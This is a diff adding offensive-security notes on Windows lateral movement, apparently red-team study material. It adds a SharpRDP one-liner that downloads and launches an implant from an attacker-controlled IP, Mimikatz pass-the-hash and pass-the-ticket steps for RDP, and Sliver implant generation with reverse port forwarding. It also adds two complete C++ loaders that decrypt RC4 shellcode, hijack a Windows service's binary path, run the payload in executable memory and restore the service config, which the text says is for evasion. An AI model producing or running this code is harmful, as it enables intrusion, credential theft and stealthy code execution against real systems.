@@ -29,6 +29,14 @@ RDP allows users to interact with a system as if they were physically present. A
   mstsc /admin /v:<target_ip>
   ```
 
+- SharpRPD notes:
+```powershell
+ .\SharpRDP.exe computername=appsrv01 command="powershell -ep bypass iwr -uri http://192.168.45.175:8000/loosespiral.exe -outfile c:\windows\tasks\ls.exe; Start-Process c:\windows\tasks\ls.exe" username=corp1\dave password=lab
+```
+- **Note:** using an `_` in the powershell iwr download resulted in failure
+- **Note:** needed a tls implant as a http/https implant wouldn't work
+
+
 ### **2. Reverse Proxying with Metasploit, Chisel, and Sliver**
 
 Attackers often need to access internal resources that aren't directly accessible from outside the network. Reverse proxies allow them to tunnel connections through compromised systems.
@@ -400,6 +408,141 @@ If an environment is specifically configured to require Restricted Admin mode fo
 ### **Conclusion**
 
 Disabling Restricted Admin mode primarily changes the security posture of RDP sessions by allowing full credentials to be transmitted to the remote machine. This can increase the risk of credential theft but does not prevent RDP access. Ensuring secure RDP connections often involves using other security measures, such as Network Level Authentication (NLA), strong passwords, multi-factor authentication, and monitoring for unusual RDP activity.
+
+To leverage Mimikatz for logging into a system via RDP and using PowerShell remoting in conjunction with it, you would typically need to understand how each tool and protocol handles authentication, especially in scenarios where you're using password hashes (pass-the-hash) or Kerberos tickets (pass-the-ticket).
+
+### **1. PowerShell Remoting and Restricted Admin Mode**
+PowerShell remoting and RDP operate over different protocols (WinRM vs. RDP), but both can be used to gain remote access to a system. Here’s how you could approach each in the context of Restricted Admin mode and Mimikatz:
+
+#### **PowerShell Remoting:**
+- **PowerShell Remoting** uses WinRM (Windows Remote Management) and typically relies on Kerberos or NTLM for authentication. It doesn't directly interact with RDP's Restricted Admin mode.
+- To enable PowerShell remoting:
+  ```powershell
+  Enable-PSRemoting -Force
+  ```
+- When using PowerShell remoting, you can authenticate using standard credentials or use techniques like pass-the-hash if you have the NTLM hash of a user's password.
+
+#### **Using Pass-the-Hash with PowerShell Remoting:**
+- You can use the `Invoke-Command` cmdlet with a specific credential object. However, to pass a hash, you’d first use Mimikatz to inject the hash into a process, allowing you to authenticate using NTLM without knowing the plaintext password.
+
+### **2. Using Mimikatz to Log in via RDP**
+
+Mimikatz allows for credential manipulation, including the ability to perform a pass-the-hash or pass-the-ticket attack. Here’s how to use Mimikatz for an RDP connection:
+
+#### **Pass-the-Hash with Mimikatz for RDP:**
+
+1. **Obtain the NTLM Hash**:
+   - First, you need the NTLM hash of the user account you wish to authenticate with. This could be obtained through various means, such as extracting it from a compromised system.
+
+2. **Inject the Hash Using Mimikatz**:
+   - Use Mimikatz to inject the NTLM hash into a process:
+
+   ```mimikatz
+   sekurlsa::pth /user:Administrator /domain:target_domain /ntlm:HASH /run:cmd.exe
+   ```
+
+   - This command opens a new command prompt (`cmd.exe`) with the injected NTLM hash for the specified user.
+
+3. **Use RDP to Connect to the Target**:
+   - From the command prompt opened by Mimikatz, you can then use the `mstsc` command to start an RDP session to the target:
+
+   ```cmd
+   mstsc /v:target_ip_address
+   ```
+
+   - If Restricted Admin mode is enabled on the target system, this RDP connection would not send the password or hash over the network. Instead, it would use the injected credentials locally.
+
+#### **Pass-the-Ticket with Mimikatz for RDP:**
+
+1. **Obtain a Kerberos Ticket**:
+   - If you have a valid Kerberos ticket (`.kirbi` file), you can inject it into the session using Mimikatz:
+
+   ```mimikatz
+   kerberos::ptt ticket.kirbi
+   ```
+
+2. **RDP Connection**:
+   - Once the ticket is injected, you can initiate an RDP session to the target without needing to enter credentials again.
+
+### **Combining PowerShell Remoting and RDP with Mimikatz:**
+
+- **PowerShell Remoting** can be used to execute commands on the remote system without an interactive session, while **RDP** provides a full GUI. If you're using Mimikatz to authenticate via pass-the-hash or pass-the-ticket, you can seamlessly transition between using PowerShell remoting and RDP.
+  
+  - For instance, you might use PowerShell remoting to disable Restricted Admin mode, then use Mimikatz with RDP to establish a GUI session.
+
+### **Security Considerations:**
+
+- **Mimikatz** is a powerful tool often used for penetration testing and red teaming, but it’s also used by attackers for malicious purposes. Ensure you’re using it in a controlled, legal environment, such as during an authorized penetration test.
+  
+- **Restricted Admin Mode** is designed to prevent credential theft by not passing credentials to the remote machine. Bypassing this with tools like Mimikatz should be done with an understanding of the security implications and in a controlled environment.
+
+
+To configure a reverse tunnel with Sliver and gain RDP access to a Windows 10 client machine, you'll need to follow these general steps:
+
+### **1. Setup and Deploy Sliver**
+Sliver is a command-and-control (C2) framework used for red teaming and adversary simulation. You’ll first need to set up a Sliver server and deploy an implant on the target machine.
+
+#### **1.1. Install Sliver on Your Server**
+- Download and install Sliver on your control server (Linux or Windows).
+- Start Sliver with the following command:
+
+```bash
+sliver-server
+```
+
+#### **1.2. Generate an Implant**
+- Inside the Sliver console, generate an implant (payload) for the target Windows machine:
+
+```shell
+generate -o windows_implant.exe -f windows/amd64 -t reverse_tcp --mtls 192.168.1.100
+```
+
+- Replace `192.168.1.100` with the IP address of your control server.
+- The `-o` flag specifies the output filename.
+- The `-f` flag specifies the target architecture and OS.
+- The `-t` flag specifies the communication method, here it's `reverse_tcp`.
+
+#### **1.3. Deploy the Implant on the Target**
+- Transfer the generated implant to the Windows 10 client machine.
+- Execute the implant on the target to establish a reverse connection back to the Sliver C2 server.
+
+### **2. Configure a Reverse Tunnel in Sliver**
+Once the implant is running on the target machine, you can use Sliver to create a reverse tunnel that allows you to access services (like RDP) on the Windows 10 machine.
+
+#### **2.1. Interact with the Implant**
+- Once the implant connects back to your server, it will show up in the Sliver interface. Interact with it:
+
+```shell
+sessions
+use <session_id>
+```
+
+- Replace `<session_id>` with the actual session ID of the implant.
+
+#### **2.2. Set Up a Reverse Tunnel for RDP**
+- In the interactive session with the implant, set up a reverse tunnel to the target's RDP service:
+
+```shell
+rportfwd add -l 3389 -r 127.0.0.1:3389
+```
+
+- This command forwards traffic from your local port 3389 to the target machine's port 3389, effectively setting up a reverse tunnel for RDP.
+
+### **3. Connect to the RDP Session**
+With the reverse tunnel in place, you can now connect to the RDP session on the Windows 10 machine:
+
+#### **3.1. Use MSTSC (RDP Client)**
+- On your control machine (where Sliver is running), use the Remote Desktop Client (`mstsc` on Windows or any RDP client on Linux):
+
+```bash
+mstsc /v:127.0.0.1:3389
+```
+
+- This command tells the RDP client to connect to `127.0.0.1:3389`, which Sliver has forwarded to the target machine’s RDP service.
+
+### **4. Monitor and Manage the Connection**
+You should now be able to access the Windows 10 client machine via RDP through the reverse tunnel established by Sliver.
+
 
 ---
 
@@ -2232,3 +2375,358 @@ int main() {
 
 - **Complexity**: This code provides a basic outline, but real-world manual mapping can be more complex, especially with advanced features like TLS callbacks, thread-local storage, or more complex import tables.
 - **Security**: Manual DLL mapping is a technique used by advanced malware to avoid detection, so it should be used responsibly and only in legal contexts, such as red teaming or research.
+Yes, it's possible to modify the code so that it starts a service after changing its configuration and then executes the shellcode. The idea is to first modify the service's binary path to point to your shellcode loader, start the service, and then execute the shellcode.
+
+Below is an updated version of the code that performs the following steps:
+
+1. **Modify the Service's Binary Path** using `ChangeServiceConfigA`.
+2. **Start the Service** using `StartServiceA`.
+3. **Execute the Shellcode**.
+
+### **1. Header File: `encrypted_payload.h`**
+This file remains unchanged and contains the RC4 key and the encrypted shellcode buffer.
+
+```cpp
+// encrypted_payload.h
+#ifndef ENCRYPTED_PAYLOAD_H
+#define ENCRYPTED_PAYLOAD_H
+
+unsigned char key[] = { 0x01, 0x02, 0x03, 0x04 }; // Replace with your actual RC4 key
+unsigned char buf[] = {
+    0x12, 0x34, 0x56, 0x78, // Encrypted shellcode bytes go here
+    0x9A, 0xBC, 0xDE, 0xF0
+};
+
+#define BUF_SIZE sizeof(buf)
+
+#endif // ENCRYPTED_PAYLOAD_H
+```
+
+### **2. Main Program: `main.cpp`**
+This program modifies the service configuration, starts the service, and then executes the decrypted shellcode.
+
+```cpp
+#include <windows.h>
+#include <iostream>
+#include "encrypted_payload.h"
+
+// RC4 decryption function
+void RC4(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
+    unsigned char S[256];
+    unsigned char temp;
+    size_t i, j = 0;
+
+    // Initialize S
+    for (i = 0; i < 256; i++) {
+        S[i] = (unsigned char)i;
+    }
+
+    // Key scheduling
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % key_len]) % 256;
+        temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+    }
+
+    // Pseudo-random generation and XOR with data
+    i = j = 0;
+    for (size_t k = 0; k < data_len; k++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+
+        data[k] ^= S[(S[i] + S[j]) % 256];
+    }
+}
+
+int main() {
+    // Define the service name
+    const char* serviceName = "YourServiceName"; // Replace with the target service name
+
+    // Define the path to a dummy executable
+    const char* dummyBinaryPath = "C:\\Windows\\System32\\cmd.exe"; // Replace with a path that exists on the system
+
+    // Open a handle to the service control manager
+    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scManager) {
+        std::cerr << "Failed to open service control manager. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Open a handle to the service
+    SC_HANDLE service = OpenServiceA(scManager, serviceName, SERVICE_ALL_ACCESS);
+    if (!service) {
+        std::cerr << "Failed to open service. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(scManager);
+        return 1;
+    }
+
+    // Modify the service binary path
+    BOOL success = ChangeServiceConfigA(
+        service,                    // Service handle
+        SERVICE_NO_CHANGE,          // Service type (no change)
+        SERVICE_NO_CHANGE,          // Start type (no change)
+        SERVICE_NO_CHANGE,          // Error control (no change)
+        dummyBinaryPath,            // Path to the dummy service binary
+        NULL,                       // Load order group (no change)
+        NULL,                       // Tag ID (no change)
+        NULL,                       // Dependencies (no change)
+        NULL,                       // Service start name (no change)
+        NULL,                       // Password (no change)
+        NULL                        // Display name (no change)
+    );
+
+    if (!success) {
+        std::cerr << "Failed to change service binary path. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        return 1;
+    }
+
+    // Start the service
+    if (!StartServiceA(service, 0, NULL)) {
+        std::cerr << "Failed to start service. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        return 1;
+    }
+
+    std::cout << "Service started successfully." << std::endl;
+
+    // Decrypt the shellcode
+    RC4(buf, BUF_SIZE, key, sizeof(key));
+
+    // Allocate memory for the shellcode
+    void* exec_mem = VirtualAlloc(0, BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        std::cerr << "VirtualAlloc failed. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        return -1;
+    }
+
+    // Copy the decrypted shellcode to the allocated memory
+    memcpy(exec_mem, buf, BUF_SIZE);
+
+    // Execute the shellcode
+    ((void(*)())exec_mem)();
+
+    // Free the allocated memory
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+
+    // Close handles
+    CloseServiceHandle(service);
+    CloseServiceHandle(scManager);
+
+    return 0;
+}
+```
+
+### **Explanation:**
+
+1. **ChangeServiceConfigA**: The service's binary path is modified to point to a harmless executable, like `cmd.exe`. This is just a placeholder to start the service without crashing it. The actual payload (shellcode) will be executed in memory after the service starts.
+
+2. **StartServiceA**: The service is started using `StartServiceA`. If the service starts successfully, the shellcode is then decrypted and executed.
+
+3. **Shellcode Execution**: The shellcode is loaded into a memory location with execute permissions, decrypted, and then executed.
+
+### **Security Considerations:**
+
+- **Testing Environment**: Ensure this code is only run in a secure, controlled environment where you have explicit permission to test.
+- **Ethics**: Unauthorized modification of services or execution of shellcode on systems is illegal and unethical. This technique should only be used for authorized security research or penetration testing.
+
+This code demonstrates how to modify a service, start it, and then execute shellcode in memory.
+
+Certainly! Here's how you can use the `QueryServiceConfig` API to detect the original service binary, execute the shellcode, and then restore the service binary back to its original state to aid in evasion.
+
+### **1. Header File: `encrypted_payload.h`**
+This file remains unchanged and contains the RC4 key and the encrypted shellcode buffer.
+
+```cpp
+// encrypted_payload.h
+#ifndef ENCRYPTED_PAYLOAD_H
+#define ENCRYPTED_PAYLOAD_H
+
+unsigned char key[] = { 0x01, 0x02, 0x03, 0x04 }; // Replace with your actual RC4 key
+unsigned char buf[] = {
+    0x12, 0x34, 0x56, 0x78, // Encrypted shellcode bytes go here
+    0x9A, 0xBC, 0xDE, 0xF0
+};
+
+#define BUF_SIZE sizeof(buf)
+
+#endif // ENCRYPTED_PAYLOAD_H
+```
+
+### **2. Main Program: `main.cpp`**
+This program now includes steps to:
+
+1. **Query the Original Service Configuration**.
+2. **Modify the Service's Binary Path**.
+3. **Start the Service** and **Execute the Shellcode**.
+4. **Restore the Original Service Binary**.
+
+```cpp
+#include <windows.h>
+#include <iostream>
+#include "encrypted_payload.h"
+
+// RC4 decryption function
+void RC4(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
+    unsigned char S[256];
+    unsigned char temp;
+    size_t i, j = 0;
+
+    // Initialize S
+    for (i = 0; i < 256; i++) {
+        S[i] = (unsigned char)i;
+    }
+
+    // Key scheduling
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % key_len]) % 256;
+        temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+    }
+
+    // Pseudo-random generation and XOR with data
+    i = j = 0;
+    for (size_t k = 0; k < data_len; k++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+
+        data[k] ^= S[(S[i] + S[j]) % 256];
+    }
+}
+
+int main() {
+    // Define the service name
+    const char* serviceName = "YourServiceName"; // Replace with the target service name
+
+    // Define the path to a dummy executable
+    const char* dummyBinaryPath = "C:\\Windows\\System32\\cmd.exe"; // Replace with a path that exists on the system
+
+    // Open a handle to the service control manager
+    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!scManager) {
+        std::cerr << "Failed to open service control manager. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Open a handle to the service
+    SC_HANDLE service = OpenServiceA(scManager, serviceName, SERVICE_ALL_ACCESS);
+    if (!service) {
+        std::cerr << "Failed to open service. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(scManager);
+        return 1;
+    }
+
+    // Query the original service configuration
+    DWORD bytesNeeded = 0;
+    QueryServiceConfigA(service, NULL, 0, &bytesNeeded);
+    LPQUERY_SERVICE_CONFIGA originalConfig = (LPQUERY_SERVICE_CONFIGA)LocalAlloc(LPTR, bytesNeeded);
+
+    if (!QueryServiceConfigA(service, originalConfig, bytesNeeded, &bytesNeeded)) {
+        std::cerr << "Failed to query service configuration. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        return 1;
+    }
+
+    // Modify the service binary path
+    BOOL success = ChangeServiceConfigA(
+        service,                    // Service handle
+        SERVICE_NO_CHANGE,          // Service type (no change)
+        SERVICE_NO_CHANGE,          // Start type (no change)
+        SERVICE_NO_CHANGE,          // Error control (no change)
+        dummyBinaryPath,            // Path to the dummy service binary
+        NULL,                       // Load order group (no change)
+        NULL,                       // Tag ID (no change)
+        NULL,                       // Dependencies (no change)
+        NULL,                       // Service start name (no change)
+        NULL,                       // Password (no change)
+        NULL                        // Display name (no change)
+    );
+
+    if (!success) {
+        std::cerr << "Failed to change service binary path. Error: " << GetLastError() << std::endl;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        LocalFree(originalConfig);
+        return 1;
+    }
+
+    // Start the service
+    if (!StartServiceA(service, 0, NULL)) {
+        std::cerr << "Failed to start service. Error: " << GetLastError() << std::endl;
+        ChangeServiceConfigA(service, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, originalConfig->lpBinaryPathName, NULL, NULL, NULL, NULL, NULL, NULL);
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        LocalFree(originalConfig);
+        return 1;
+    }
+
+    std::cout << "Service started successfully." << std::endl;
+
+    // Decrypt the shellcode
+    RC4(buf, BUF_SIZE, key, sizeof(key));
+
+    // Allocate memory for the shellcode
+    void* exec_mem = VirtualAlloc(0, BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+        std::cerr << "VirtualAlloc failed. Error: " << GetLastError() << std::endl;
+        ChangeServiceConfigA(service, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, originalConfig->lpBinaryPathName, NULL, NULL, NULL, NULL, NULL, NULL);
+        CloseServiceHandle(service);
+        CloseServiceHandle(scManager);
+        LocalFree(originalConfig);
+        return -1;
+    }
+
+    // Copy the decrypted shellcode to the allocated memory
+    memcpy(exec_mem, buf, BUF_SIZE);
+
+    // Execute the shellcode
+    ((void(*)())exec_mem)();
+
+    // Free the allocated memory
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+
+    // Restore the original service binary path
+    if (!ChangeServiceConfigA(service, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, originalConfig->lpBinaryPathName, NULL, NULL, NULL, NULL, NULL, NULL)) {
+        std::cerr << "Failed to restore original service binary path. Error: " << GetLastError() << std::endl;
+    } else {
+        std::cout << "Service binary path restored to original." << std::endl;
+    }
+
+    // Clean up
+    CloseServiceHandle(service);
+    CloseServiceHandle(scManager);
+    LocalFree(originalConfig);
+
+    return 0;
+}
+```
+
+### **Explanation:**
+
+1. **QueryServiceConfigA**: Before modifying the service, the `QueryServiceConfigA` API is used to obtain the original configuration of the service, specifically the original binary path. This information is stored in `originalConfig`.
+
+2. **ChangeServiceConfigA**: The service's binary path is modified to a dummy executable. 
+
+3. **StartServiceA**: The service is started. If it starts successfully, the shellcode is then decrypted and executed in memory.
+
+4. **Restore Original Configuration**: After executing the shellcode, the service's original binary path is restored using the information obtained from `QueryServiceConfigA`. This helps in evading detection by returning the service to its original state.
+
+### **Security Considerations:**
+
+- **Testing Environment**: Ensure this code is only run in a secure, controlled environment with explicit permission.
+- **Ethics**: Unauthorized modification of services or execution of shellcode is illegal and unethical. This technique should only be used for authorized security research or penetration testing.
+
+This approach allows for the temporary modification of a service for executing arbitrary code, with the added benefit of restoring the service to its original configuration, aiding in evasion.
